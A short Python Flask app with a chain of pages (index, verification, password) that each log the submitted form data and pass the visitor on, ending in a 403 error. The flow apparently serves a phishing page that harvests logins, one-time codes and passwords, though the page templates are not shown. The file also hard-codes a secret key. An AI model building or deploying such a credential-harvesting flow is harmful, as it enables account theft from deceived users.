from flask import Flask, render_template, url_for, request, redirect, abort
import os

app = Flask(__name__)

app.config['SECRET_KEY'] = 'fghj47fghj35g65h6k77'


@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        print(request.form)
        return redirect(url_for('verification'))

    return render_template('index.html')


@app.route('/verification', methods=['POST', 'GET'])
def verification():
    if request.method == 'POST':
        print(request.form)
        return redirect(url_for('passw'))

    return render_template('verification.html')


@app.route("/passw", methods=['POST', 'GET'])
def passw():
    if request.method == 'POST':
        print(request.form)
        return redirect(url_for('opros'))

    return render_template('passw.html')


@app.route('/opros')
def opros():
    return abort(403)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
